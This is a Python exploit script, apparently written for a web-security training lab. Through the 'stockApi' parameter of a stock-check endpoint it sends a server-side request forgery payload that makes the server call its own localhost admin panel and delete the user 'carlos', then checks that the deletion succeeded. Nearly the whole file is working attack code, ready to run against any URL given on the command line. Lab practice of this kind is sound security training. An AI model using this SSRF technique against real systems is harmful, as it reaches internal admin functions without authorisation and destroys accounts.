#our reconasense info is  
#localhost_URL = http://localhost/
#admin_URL = http://localhost/admin
#carlos_deletetion_Url = http://localhost/admin/delete?username=carlos
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#disabling url warning

proxies ={'http' : 'http://127.0.0.1:8080' ,'https':'http://127.0.0.1:8080'} 
#setting proxies to the burb to be able to debug through the burb in case if code does not work


def delete_user(url):
    #ssrf payload
    delete_user_url="http://localhost/admin/delete?username=carlos" #SSRF payload
    check_stock_path="/product/stock"
    params_deletion={'stockApi':delete_user_url}
    #sending request to delete the user
    req=requests.post(url +check_stock_path ,data=params_deletion
    ,verify=False, proxies=proxies )
    #now the user is deleted
    # we need to check if it is actully deleted
    admin_interface='http://localhost/admin'
    params_checking={'stockApi':admin_interface}
    req=requests.post(url +check_stock_path ,data=params_checking
    ,verify=False, proxies=proxies )
    
    if 'User deleted successfuly' in req.text:
        print('(+) Succesfully deleted carlos user')
    
    else:
        print('(-) Unsuccessful exploit')    




def main():
    #in case the user entrered wrong values 
    if(len(sys.argv) != 2):
        print("(+) Usage: %s <url>" % sys.argv[0])#note that %s is name of script
        #user insructions
        print("(+) Example %s www.example.com" % sys.argv[0] )
        #note that % sys.argv[0] stands for the name of the program
        sys.exit(-1)
    url=sys.argv[1]  
    print("(+) Deleting carlos") 
    delete_user(url) 


if __name__ == "__main__":
    main()
    
    
#to run this code
#write in terminal
#python3 1-SSRF_against_local_server.py "Url of the lab"   